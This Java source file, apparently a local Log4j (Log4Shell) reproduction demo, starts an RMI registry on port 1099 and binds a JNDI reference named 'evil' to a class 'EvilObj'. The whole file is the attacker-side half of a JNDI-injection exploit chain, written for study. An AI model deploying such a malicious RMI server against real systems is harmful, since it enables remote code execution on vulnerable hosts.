package com.eric.javaDemo.log4jTest;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * <pre>
 * 描述：TODO
 * </pre>
 *
 * @author： wuy
 * @date: 2021/12/27 11:49
 */
public class RMIServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Create RMI registry on port 1099");
            Reference reference = new Reference("com.eric.javaDemo.log4jTest.EvilObj", "com.eric.javaDemo.log4jTest.EvilObj", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
